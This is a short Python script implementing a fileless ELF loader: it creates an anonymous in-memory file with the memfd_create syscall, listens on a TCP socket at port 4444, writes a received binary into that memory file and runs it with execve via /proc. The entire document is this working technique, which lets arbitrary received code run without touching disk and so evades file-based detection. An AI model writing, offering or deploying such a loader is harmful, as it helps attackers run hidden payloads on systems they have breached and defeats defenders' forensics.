"""
* create an anonymous (memory only) file with the memfd_create syscall
* open TCP bind socket
* pipe ELF binary from socket to the file descriptor
* execute with execve.
"""

import ctypes
from struct import calcsize
import os
from sys import argv
import socket



def usage():
    print("[!] Usage: python3 {} elf_binary".format(argv[0]))
    exit(1)


def syscall_num():
    """
    Return architecture appropriate syscall number
    """
    if calcsize("P") * 8 == 32:
        return 356
    else:
        return 319


def memfd_create():
    """
    Get functions pointer to libc:syscall.  Set ret and arg types before calling.

    Name is not required.  MFD_CLOEXEC - closes file descriptor on execve.
    """
    syscall = ctypes.CDLL(None).syscall
    syscall.restype = ctypes.c_int
    syscall.argtypes = ctypes.c_long, ctypes.c_char_p, ctypes.c_uint

    name = ctypes.ARRAY(ctypes.c_char, 0)()

    MFD_CLOEXEC = 1

    fd = syscall(syscall_num(), name, MFD_CLOEXEC)
    if fd == -1:
        print("[!] memfd_create error")
        exit(1)

    return fd


def bind_socket():
    sock = socket.socket()
    sock.bind(("127.0.0.1", 4444))

    sock.listen(1)
    conn, _ = sock.accept()

    return conn


def pipe_elf(conn, fd):
    """
    Write ELF binary into the file descriptor
    """
    while True:
        data = conn.recv(1024)
        if not data:
            break
        os.write(fd, data)


def execute(fd):
    """
    execve requires the path to the file descriptor
    """
    pid = os.getpid()

    path = "/proc/{}/fd/{}".format(pid, fd)
    argv = [path]
    env = {}

    os.execve(path, argv,  env)


if __name__ == "__main__":
    if len(argv) < 1:
        usage()

    fd = memfd_create()

    pipe_elf(bind_socket(), fd)

    execute(fd)

